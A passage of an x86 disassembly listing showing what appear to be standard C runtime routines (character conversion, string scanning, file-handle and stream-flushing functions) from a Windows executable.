  40ddcf:	25 ff ff 00 00       	and    $0xffff,%eax
  40ddd4:	3d ff 00 00 00       	cmp    $0xff,%eax
  40ddd9:	7e 10                	jle    0x40ddeb
  40dddb:	e8 20 e3 ff ff       	call   0x40c100
  40dde0:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40dde6:	83 c8 ff             	or     $0xffffffff,%eax
  40dde9:	eb 61                	jmp    0x40de4c
  40ddeb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ddee:	8a 55 0c             	mov    0xc(%ebp),%dl
  40ddf1:	88 11                	mov    %dl,(%ecx)
  40ddf3:	b8 01 00 00 00       	mov    $0x1,%eax
  40ddf8:	eb 52                	jmp    0x40de4c
  40ddfa:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40de01:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40de04:	50                   	push   %eax
  40de05:	6a 00                	push   $0x0
  40de07:	8b 0d 10 d5 45 00    	mov    0x45d510,%ecx
  40de0d:	51                   	push   %ecx
  40de0e:	8b 55 08             	mov    0x8(%ebp),%edx
  40de11:	52                   	push   %edx
  40de12:	6a 01                	push   $0x1
  40de14:	8d 45 0c             	lea    0xc(%ebp),%eax
  40de17:	50                   	push   %eax
  40de18:	68 20 02 00 00       	push   $0x220
  40de1d:	8b 0d 90 de 45 00    	mov    0x45de90,%ecx
  40de23:	51                   	push   %ecx
  40de24:	ff 15 78 f0 40 00    	call   *0x40f078
  40de2a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40de2d:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40de31:	74 06                	je     0x40de39
  40de33:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40de37:	74 10                	je     0x40de49
  40de39:	e8 c2 e2 ff ff       	call   0x40c100
  40de3e:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  40de44:	83 c8 ff             	or     $0xffffffff,%eax
  40de47:	eb 03                	jmp    0x40de4c
  40de49:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40de4c:	8b e5                	mov    %ebp,%esp
  40de4e:	5d                   	pop    %ebp
  40de4f:	c3                   	ret
  40de50:	55                   	push   %ebp
  40de51:	8b ec                	mov    %esp,%ebp
  40de53:	56                   	push   %esi
  40de54:	33 c0                	xor    %eax,%eax
  40de56:	50                   	push   %eax
  40de57:	50                   	push   %eax
  40de58:	50                   	push   %eax
  40de59:	50                   	push   %eax
  40de5a:	50                   	push   %eax
  40de5b:	50                   	push   %eax
  40de5c:	50                   	push   %eax
  40de5d:	50                   	push   %eax
  40de5e:	8b 55 0c             	mov    0xc(%ebp),%edx
  40de61:	8d 49 00             	lea    0x0(%ecx),%ecx
  40de64:	8a 02                	mov    (%edx),%al
  40de66:	0a c0                	or     %al,%al
  40de68:	74 07                	je     0x40de71
  40de6a:	42                   	inc    %edx
  40de6b:	0f ab 04 24          	bts    %eax,(%esp)
  40de6f:	eb f3                	jmp    0x40de64
  40de71:	8b 75 08             	mov    0x8(%ebp),%esi
  40de74:	83 c9 ff             	or     $0xffffffff,%ecx
  40de77:	90                   	nop
  40de78:	41                   	inc    %ecx
  40de79:	8a 06                	mov    (%esi),%al
  40de7b:	0a c0                	or     %al,%al
  40de7d:	74 07                	je     0x40de86
  40de7f:	46                   	inc    %esi
  40de80:	0f a3 04 24          	bt     %eax,(%esp)
  40de84:	73 f2                	jae    0x40de78
  40de86:	8b c1                	mov    %ecx,%eax
  40de88:	83 c4 20             	add    $0x20,%esp
  40de8b:	5e                   	pop    %esi
  40de8c:	c9                   	leave
  40de8d:	c3                   	ret
  40de8e:	cc                   	int3
  40de8f:	cc                   	int3
  40de90:	55                   	push   %ebp
  40de91:	8b ec                	mov    %esp,%ebp
  40de93:	56                   	push   %esi
  40de94:	33 c0                	xor    %eax,%eax
  40de96:	50                   	push   %eax
  40de97:	50                   	push   %eax
  40de98:	50                   	push   %eax
  40de99:	50                   	push   %eax
  40de9a:	50                   	push   %eax
  40de9b:	50                   	push   %eax
  40de9c:	50                   	push   %eax
  40de9d:	50                   	push   %eax
  40de9e:	8b 55 0c             	mov    0xc(%ebp),%edx
  40dea1:	8d 49 00             	lea    0x0(%ecx),%ecx
  40dea4:	8a 02                	mov    (%edx),%al
  40dea6:	0a c0                	or     %al,%al
  40dea8:	74 07                	je     0x40deb1
  40deaa:	42                   	inc    %edx
  40deab:	0f ab 04 24          	bts    %eax,(%esp)
  40deaf:	eb f3                	jmp    0x40dea4
  40deb1:	8b 75 08             	mov    0x8(%ebp),%esi
  40deb4:	8a 06                	mov    (%esi),%al
  40deb6:	0a c0                	or     %al,%al
  40deb8:	74 0a                	je     0x40dec4
  40deba:	46                   	inc    %esi
  40debb:	0f a3 04 24          	bt     %eax,(%esp)
  40debf:	73 f3                	jae    0x40deb4
  40dec1:	8d 46 ff             	lea    -0x1(%esi),%eax
  40dec4:	83 c4 20             	add    $0x20,%esp
  40dec7:	5e                   	pop    %esi
  40dec8:	c9                   	leave
  40dec9:	c3                   	ret
  40deca:	cc                   	int3
  40decb:	cc                   	int3
  40decc:	cc                   	int3
  40decd:	cc                   	int3
  40dece:	cc                   	int3
  40decf:	cc                   	int3
  40ded0:	55                   	push   %ebp
  40ded1:	8b ec                	mov    %esp,%ebp
  40ded3:	51                   	push   %ecx
  40ded4:	8b 45 08             	mov    0x8(%ebp),%eax
  40ded7:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40dedd:	0f 83 a8 00 00 00    	jae    0x40df8b
  40dee3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dee6:	c1 f9 05             	sar    $0x5,%ecx
  40dee9:	8b 55 08             	mov    0x8(%ebp),%edx
  40deec:	83 e2 1f             	and    $0x1f,%edx
  40deef:	6b d2 24             	imul   $0x24,%edx,%edx
  40def2:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40def9:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40defe:	83 e1 01             	and    $0x1,%ecx
  40df01:	85 c9                	test   %ecx,%ecx
  40df03:	0f 84 82 00 00 00    	je     0x40df8b
  40df09:	8b 55 08             	mov    0x8(%ebp),%edx
  40df0c:	c1 fa 05             	sar    $0x5,%edx
  40df0f:	8b 45 08             	mov    0x8(%ebp),%eax
  40df12:	83 e0 1f             	and    $0x1f,%eax
  40df15:	6b c0 24             	imul   $0x24,%eax,%eax
  40df18:	8b 0c 95 60 f2 45 00 	mov    0x45f260(,%edx,4),%ecx
  40df1f:	83 3c 01 ff          	cmpl   $0xffffffff,(%ecx,%eax,1)
  40df23:	74 66                	je     0x40df8b
  40df25:	83 3d 64 af 45 00 01 	cmpl   $0x1,0x45af64
  40df2c:	75 3c                	jne    0x40df6a
  40df2e:	8b 55 08             	mov    0x8(%ebp),%edx
  40df31:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40df34:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40df38:	74 0e                	je     0x40df48
  40df3a:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  40df3e:	74 14                	je     0x40df54
  40df40:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  40df44:	74 1a                	je     0x40df60
  40df46:	eb 22                	jmp    0x40df6a
  40df48:	6a 00                	push   $0x0
  40df4a:	6a f6                	push   $0xfffffff6
  40df4c:	ff 15 f0 f0 40 00    	call   *0x40f0f0
  40df52:	eb 16                	jmp    0x40df6a
  40df54:	6a 00                	push   $0x0
  40df56:	6a f5                	push   $0xfffffff5
  40df58:	ff 15 f0 f0 40 00    	call   *0x40f0f0
  40df5e:	eb 0a                	jmp    0x40df6a
  40df60:	6a 00                	push   $0x0
  40df62:	6a f4                	push   $0xfffffff4
  40df64:	ff 15 f0 f0 40 00    	call   *0x40f0f0
  40df6a:	8b 45 08             	mov    0x8(%ebp),%eax
  40df6d:	c1 f8 05             	sar    $0x5,%eax
  40df70:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40df73:	83 e1 1f             	and    $0x1f,%ecx
  40df76:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40df79:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40df80:	c7 04 0a ff ff ff ff 	movl   $0xffffffff,(%edx,%ecx,1)
  40df87:	33 c0                	xor    %eax,%eax
  40df89:	eb 19                	jmp    0x40dfa4
  40df8b:	e8 70 e1 ff ff       	call   0x40c100
  40df90:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40df96:	e8 75 e1 ff ff       	call   0x40c110
  40df9b:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40dfa1:	83 c8 ff             	or     $0xffffffff,%eax
  40dfa4:	8b e5                	mov    %ebp,%esp
  40dfa6:	5d                   	pop    %ebp
  40dfa7:	c3                   	ret
  40dfa8:	cc                   	int3
  40dfa9:	cc                   	int3
  40dfaa:	cc                   	int3
  40dfab:	cc                   	int3
  40dfac:	cc                   	int3
  40dfad:	cc                   	int3
  40dfae:	cc                   	int3
  40dfaf:	cc                   	int3
  40dfb0:	55                   	push   %ebp
  40dfb1:	8b ec                	mov    %esp,%ebp
  40dfb3:	8b 45 08             	mov    0x8(%ebp),%eax
  40dfb6:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40dfbc:	73 3d                	jae    0x40dffb
  40dfbe:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dfc1:	c1 f9 05             	sar    $0x5,%ecx
  40dfc4:	8b 55 08             	mov    0x8(%ebp),%edx
  40dfc7:	83 e2 1f             	and    $0x1f,%edx
  40dfca:	6b d2 24             	imul   $0x24,%edx,%edx
  40dfcd:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40dfd4:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40dfd9:	83 e1 01             	and    $0x1,%ecx
  40dfdc:	85 c9                	test   %ecx,%ecx
  40dfde:	74 1b                	je     0x40dffb
  40dfe0:	8b 55 08             	mov    0x8(%ebp),%edx
  40dfe3:	c1 fa 05             	sar    $0x5,%edx
  40dfe6:	8b 45 08             	mov    0x8(%ebp),%eax
  40dfe9:	83 e0 1f             	and    $0x1f,%eax
  40dfec:	6b c0 24             	imul   $0x24,%eax,%eax
  40dfef:	8b 0c 95 60 f2 45 00 	mov    0x45f260(,%edx,4),%ecx
  40dff6:	8b 04 01             	mov    (%ecx,%eax,1),%eax
  40dff9:	eb 19                	jmp    0x40e014
  40dffb:	e8 00 e1 ff ff       	call   0x40c100
  40e000:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40e006:	e8 05 e1 ff ff       	call   0x40c110
  40e00b:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40e011:	83 c8 ff             	or     $0xffffffff,%eax
  40e014:	5d                   	pop    %ebp
  40e015:	c3                   	ret
  40e016:	cc                   	int3
  40e017:	cc                   	int3
  40e018:	cc                   	int3
  40e019:	cc                   	int3
  40e01a:	cc                   	int3
  40e01b:	cc                   	int3
  40e01c:	cc                   	int3
  40e01d:	cc                   	int3
  40e01e:	cc                   	int3
  40e01f:	cc                   	int3
  40e020:	55                   	push   %ebp
  40e021:	8b ec                	mov    %esp,%ebp
  40e023:	51                   	push   %ecx
  40e024:	8b 45 08             	mov    0x8(%ebp),%eax
  40e027:	c1 f8 05             	sar    $0x5,%eax
  40e02a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e02d:	83 e1 1f             	and    $0x1f,%ecx
  40e030:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40e033:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40e03a:	03 d1                	add    %ecx,%edx
  40e03c:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40e03f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e042:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  40e046:	75 39                	jne    0x40e081
  40e048:	6a 11                	push   $0x11
  40e04a:	e8 21 54 ff ff       	call   0x403470
  40e04f:	83 c4 04             	add    $0x4,%esp
  40e052:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40e055:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  40e059:	75 1c                	jne    0x40e077
  40e05b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40e05e:	83 c2 0c             	add    $0xc,%edx
  40e061:	52                   	push   %edx
  40e062:	ff 15 30 f0 40 00    	call   *0x40f030
  40e068:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e06b:	8b 48 08             	mov    0x8(%eax),%ecx
  40e06e:	83 c1 01             	add    $0x1,%ecx
  40e071:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40e074:	89 4a 08             	mov    %ecx,0x8(%edx)
  40e077:	6a 11                	push   $0x11
  40e079:	e8 92 54 ff ff       	call   0x403510
  40e07e:	83 c4 04             	add    $0x4,%esp
  40e081:	8b 45 08             	mov    0x8(%ebp),%eax
  40e084:	c1 f8 05             	sar    $0x5,%eax
  40e087:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e08a:	83 e1 1f             	and    $0x1f,%ecx
  40e08d:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40e090:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40e097:	8d 44 0a 0c          	lea    0xc(%edx,%ecx,1),%eax
  40e09b:	50                   	push   %eax
  40e09c:	ff 15 38 f0 40 00    	call   *0x40f038
  40e0a2:	8b e5                	mov    %ebp,%esp
  40e0a4:	5d                   	pop    %ebp
  40e0a5:	c3                   	ret
  40e0a6:	cc                   	int3
  40e0a7:	cc                   	int3
  40e0a8:	cc                   	int3
  40e0a9:	cc                   	int3
  40e0aa:	cc                   	int3
  40e0ab:	cc                   	int3
  40e0ac:	cc                   	int3
  40e0ad:	cc                   	int3
  40e0ae:	cc                   	int3
  40e0af:	cc                   	int3
  40e0b0:	55                   	push   %ebp
  40e0b1:	8b ec                	mov    %esp,%ebp
  40e0b3:	8b 45 08             	mov    0x8(%ebp),%eax
  40e0b6:	c1 f8 05             	sar    $0x5,%eax
  40e0b9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e0bc:	83 e1 1f             	and    $0x1f,%ecx
  40e0bf:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40e0c2:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40e0c9:	8d 44 0a 0c          	lea    0xc(%edx,%ecx,1),%eax
  40e0cd:	50                   	push   %eax
  40e0ce:	ff 15 3c f0 40 00    	call   *0x40f03c
  40e0d4:	5d                   	pop    %ebp
  40e0d5:	c3                   	ret
  40e0d6:	cc                   	int3
  40e0d7:	cc                   	int3
  40e0d8:	cc                   	int3
  40e0d9:	cc                   	int3
  40e0da:	cc                   	int3
  40e0db:	cc                   	int3
  40e0dc:	cc                   	int3
  40e0dd:	cc                   	int3
  40e0de:	cc                   	int3
  40e0df:	cc                   	int3
  40e0e0:	55                   	push   %ebp
  40e0e1:	8b ec                	mov    %esp,%ebp
  40e0e3:	83 ec 08             	sub    $0x8,%esp
  40e0e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40e0ed:	6a 02                	push   $0x2
  40e0ef:	e8 7c 53 ff ff       	call   0x403470
  40e0f4:	83 c4 04             	add    $0x4,%esp
  40e0f7:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
  40e0fe:	eb 09                	jmp    0x40e109
  40e100:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e103:	83 c0 01             	add    $0x1,%eax
  40e106:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40e109:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40e10c:	3b 0d 00 f0 45 00    	cmp    0x45f000,%ecx
  40e112:	0f 8d 91 00 00 00    	jge    0x40e1a9
  40e118:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e11b:	a1 f0 df 45 00       	mov    0x45dff0,%eax
  40e120:	83 3c 90 00          	cmpl   $0x0,(%eax,%edx,4)
  40e124:	74 7e                	je     0x40e1a4
  40e126:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40e129:	8b 15 f0 df 45 00    	mov    0x45dff0,%edx
  40e12f:	8b 04 8a             	mov    (%edx,%ecx,4),%eax
  40e132:	8b 48 0c             	mov    0xc(%eax),%ecx
  40e135:	81 e1 83 00 00 00    	and    $0x83,%ecx
  40e13b:	85 c9                	test   %ecx,%ecx
  40e13d:	74 22                	je     0x40e161
  40e13f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e142:	a1 f0 df 45 00       	mov    0x45dff0,%eax
  40e147:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  40e14a:	51                   	push   %ecx
  40e14b:	e8 c0 04 00 00       	call   0x40e610
  40e150:	83 c4 04             	add    $0x4,%esp
  40e153:	83 f8 ff             	cmp    $0xffffffff,%eax
  40e156:	74 09                	je     0x40e161
  40e158:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40e15b:	83 c2 01             	add    $0x1,%edx
  40e15e:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40e161:	83 7d f8 14          	cmpl   $0x14,-0x8(%ebp)
  40e165:	7c 3d                	jl     0x40e1a4
  40e167:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e16a:	8b 0d f0 df 45 00    	mov    0x45dff0,%ecx
  40e170:	8b 14 81             	mov    (%ecx,%eax,4),%edx
  40e173:	83 c2 20             	add    $0x20,%edx
  40e176:	52                   	push   %edx
  40e177:	ff 15 34 f0 40 00    	call   *0x40f034
  40e17d:	6a 02                	push   $0x2
  40e17f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e182:	8b 0d f0 df 45 00    	mov    0x45dff0,%ecx
  40e188:	8b 14 81             	mov    (%ecx,%eax,4),%edx
  40e18b:	52                   	push   %edx
  40e18c:	e8 9f 80 ff ff       	call   0x406230
  40e191:	83 c4 08             	add    $0x8,%esp
  40e194:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e197:	8b 0d f0 df 45 00    	mov    0x45dff0,%ecx
  40e19d:	c7 04 81 00 00 00 00 	movl   $0x0,(%ecx,%eax,4)
  40e1a4:	e9 57 ff ff ff       	jmp    0x40e100
  40e1a9:	6a 02                	push   $0x2
  40e1ab:	e8 60 53 ff ff       	call   0x403510
  40e1b0:	83 c4 04             	add    $0x4,%esp
  40e1b3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e1b6:	8b e5                	mov    %ebp,%esp
  40e1b8:	5d                   	pop    %ebp
  40e1b9:	c3                   	ret
  40e1ba:	cc                   	int3
  40e1bb:	cc                   	int3
  40e1bc:	cc                   	int3
  40e1bd:	cc                   	int3
  40e1be:	cc                   	int3
  40e1bf:	cc                   	int3
  40e1c0:	55                   	push   %ebp
  40e1c1:	8b ec                	mov    %esp,%ebp
  40e1c3:	8b 45 08             	mov    0x8(%ebp),%eax
  40e1c6:	50                   	push   %eax
  40e1c7:	e8 44 00 00 00       	call   0x40e210
  40e1cc:	83 c4 04             	add    $0x4,%esp
  40e1cf:	85 c0                	test   %eax,%eax
  40e1d1:	74 05                	je     0x40e1d8
  40e1d3:	83 c8 ff             	or     $0xffffffff,%eax
  40e1d6:	eb 27                	jmp    0x40e1ff
  40e1d8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40e1db:	8b 51 0c             	mov    0xc(%ecx),%edx
  40e1de:	81 e2 00 40 00 00    	and    $0x4000,%edx
  40e1e4:	85 d2                	test   %edx,%edx
  40e1e6:	74 15                	je     0x40e1fd
  40e1e8:	8b 45 08             	mov    0x8(%ebp),%eax
  40e1eb:	8b 48 10             	mov    0x10(%eax),%ecx
  40e1ee:	51                   	push   %ecx
  40e1ef:	e8 6c 05 00 00       	call   0x40e760
  40e1f4:	83 c4 04             	add    $0x4,%esp
  40e1f7:	f7 d8                	neg    %eax
  40e1f9:	1b c0                	sbb    %eax,%eax
  40e1fb:	eb 02                	jmp    0x40e1ff
  40e1fd:	33 c0                	xor    %eax,%eax
  40e1ff:	5d                   	pop    %ebp
  40e200:	c3                   	ret
  40e201:	cc                   	int3
  40e202:	cc                   	int3
  40e203:	cc                   	int3
  40e204:	cc                   	int3
  40e205:	cc                   	int3
  40e206:	cc                   	int3
  40e207:	cc                   	int3
  40e208:	cc                   	int3
  40e209:	cc                   	int3
  40e20a:	cc                   	int3
  40e20b:	cc                   	int3
  40e20c:	cc                   	int3
  40e20d:	cc                   	int3
  40e20e:	cc                   	int3
  40e20f:	cc                   	int3
  40e210:	55                   	push   %ebp
  40e211:	8b ec                	mov    %esp,%ebp
  40e213:	83 ec 0c             	sub    $0xc,%esp
  40e216:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40e21d:	8b 45 08             	mov    0x8(%ebp),%eax
  40e220:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40e223:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40e226:	8b 51 0c             	mov    0xc(%ecx),%edx
  40e229:	83 e2 03             	and    $0x3,%edx
  40e22c:	83 fa 02             	cmp    $0x2,%edx
  40e22f:	75 7a                	jne    0x40e2ab
  40e231:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e234:	8b 48 0c             	mov    0xc(%eax),%ecx
  40e237:	81 e1 08 01 00 00    	and    $0x108,%ecx
  40e23d:	85 c9                	test   %ecx,%ecx
  40e23f:	74 6a                	je     0x40e2ab
  40e241:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e244:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e247:	8b 0a                	mov    (%edx),%ecx
  40e249:	2b 48 08             	sub    0x8(%eax),%ecx
  40e24c:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40e24f:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40e253:	7e 56                	jle    0x40e2ab
  40e255:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40e258:	52                   	push   %edx
  40e259:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e25c:	8b 48 08             	mov    0x8(%eax),%ecx
  40e25f:	51                   	push   %ecx
  40e260:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e263:	8b 42 10             	mov    0x10(%edx),%eax
  40e266:	50                   	push   %eax
  40e267:	e8 74 f4 ff ff       	call   0x40d6e0
  40e26c:	83 c4 0c             	add    $0xc,%esp
  40e26f:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  40e272:	75 21                	jne    0x40e295
  40e274:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40e277:	8b 51 0c             	mov    0xc(%ecx),%edx
  40e27a:	81 e2 80 00 00 00    	and    $0x80,%edx
  40e280:	85 d2                	test   %edx,%edx
  40e282:	74 0f                	je     0x40e293
  40e284:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e287:	8b 48 0c             	mov    0xc(%eax),%ecx
  40e28a:	83 e1 fd             	and    $0xfffffffd,%ecx
  40e28d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e290:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40e293:	eb 16                	jmp    0x40e2ab
  40e295:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e298:	8b 48 0c             	mov    0xc(%eax),%ecx
  40e29b:	83 c9 20             	or     $0x20,%ecx
  40e29e:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40e2a1:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40e2a4:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40e2ab:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e2ae:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40e2b1:	8b 51 08             	mov    0x8(%ecx),%edx
  40e2b4:	89 10                	mov    %edx,(%eax)
  40e2b6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40e2b9:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40e2c0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40e2c3:	8b e5                	mov    %ebp,%esp
  40e2c5:	5d                   	pop    %ebp
  40e2c6:	c3                   	ret
  40e2c7:	cc                   	int3
  40e2c8:	cc                   	int3
  40e2c9:	cc                   	int3
  40e2ca:	cc                   	int3
  40e2cb:	cc                   	int3
  40e2cc:	cc                   	int3
  40e2cd:	cc                   	int3
  40e2ce:	cc                   	int3
  40e2cf:	cc                   	int3
  40e2d0:	55                   	push   %ebp
  40e2d1:	8b ec                	mov    %esp,%ebp
  40e2d3:	6a 01                	push   $0x1
  40e2d5:	e8 06 00 00 00       	call   0x40e2e0
  40e2da:	83 c4 04             	add    $0x4,%esp
  40e2dd:	5d                   	pop    %ebp
  40e2de:	c3                   	ret
  40e2df:	cc                   	int3
  40e2e0:	55                   	push   %ebp
  40e2e1:	8b ec                	mov    %esp,%ebp
  40e2e3:	83 ec 0c             	sub    $0xc,%esp
  40e2e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40e2ed:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40e2f4:	6a 02                	push   $0x2
  40e2f6:	e8 75 51 ff ff       	call   0x403470
  40e2fb:	83 c4 04             	add    $0x4,%esp
  40e2fe:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40e305:	eb 09                	jmp    0x40e310
  40e307:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e30a:	83 c0 01             	add    $0x1,%eax
  40e30d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40e310:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40e313:	3b 0d 00 f0 45 00    	cmp    0x45f000,%ecx
  40e319:	0f 8d e4 00 00 00    	jge    0x40e403
  40e31f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40e322:	a1 f0 df 45 00       	mov    0x45dff0,%eax
  40e327:	83 3c 90 00          	cmpl   $0x0,(%eax,%edx,4)
  40e32b:	0f 84 cd 00 00 00    	je     0x40e3fe
  40e331:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40e334:	8b 15 f0 df 45 00    	mov    0x45dff0,%edx
  40e33a:	8b 04 8a             	mov    (%edx,%ecx,4),%eax
  40e33d:	8b 48 0c             	mov    0xc(%eax),%ecx
  40e340:	81 e1 83 00 00 00    	and    $0x83,%ecx
  40e346:	85 c9                	test   %ecx,%ecx
  40e348:	0f 84 b0 00 00 00    	je     0x40e3fe
  40e34e:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40e351:	a1 f0 df 45 00       	mov    0x45dff0,%eax
  40e356:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  40e359:	51                   	push   %ecx
  40e35a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40e35d:	52                   	push   %edx
  40e35e:	e8 2d f9 ff ff       	call   0x40dc90
  40e363:	83 c4 08             	add    $0x8,%esp
  40e366:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e369:	8b 0d f0 df 45 00    	mov    0x45dff0,%ecx
  40e36f:	8b 14 81             	mov    (%ecx,%eax,4),%edx
  40e372:	8b 42 0c             	mov    0xc(%edx),%eax
  40e375:	25 83 00 00 00       	and    $0x83,%eax
  40e37a:	85 c0                	test   %eax,%eax
  40e37c:	74 67                	je     0x40e3e5
  40e37e:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  40e382:	75 25                	jne    0x40e3a9
  40e384:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40e387:	8b 15 f0 df 45 00    	mov    0x45dff0,%edx
  40e38d:	8b 04 8a             	mov    (%edx,%ecx,4),%eax
  40e390:	50                   	push   %eax
  40e391:	e8 2a fe ff ff       	call   0x40e1c0
  40e396:	83 c4 04             	add    $0x4,%esp
  40e399:	83 f8 ff             	cmp    $0xffffffff,%eax
  40e39c:	74 09                	je     0x40e3a7
  40e39e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40e3a1:	83 c1 01             	add    $0x1,%ecx
  40e3a4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40e3a7:	eb 3c                	jmp    0x40e3e5
  40e3a9:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40e3ad:	75 36                	jne    0x40e3e5
  40e3af:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40e3b2:	a1 f0 df 45 00       	mov    0x45dff0,%eax
  40e3b7:	8b 0c 90             	mov    (%eax,%edx,4),%ecx
  40e3ba:	8b 51 0c             	mov    0xc(%ecx),%edx
  40e3bd:	83 e2 02             	and    $0x2,%edx
  40e3c0:	85 d2                	test   %edx,%edx
  40e3c2:	74 21                	je     0x40e3e5
  40e3c4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e3c7:	8b 0d f0 df 45 00    	mov    0x45dff0,%ecx
  40e3cd:	8b 14 81             	mov    (%ecx,%eax,4),%edx
  40e3d0:	52                   	push   %edx
  40e3d1:	e8 ea fd ff ff       	call   0x40e1c0
  40e3d6:	83 c4 04             	add    $0x4,%esp
  40e3d9:	83 f8 ff             	cmp    $0xffffffff,%eax
  40e3dc:	75 07                	jne    0x40e3e5
  40e3de:	c7 45 f8 ff ff ff ff 	movl   $0xffffffff,-0x8(%ebp)
  40e3e5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e3e8:	8b 0d f0 df 45 00    	mov    0x45dff0,%ecx
  40e3ee:	8b 14 81             	mov    (%ecx,%eax,4),%edx
  40e3f1:	52                   	push   %edx
  40e3f2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40e3f5:	50                   	push   %eax
  40e3f6:	e8 05 f9 ff ff       	call   0x40dd00
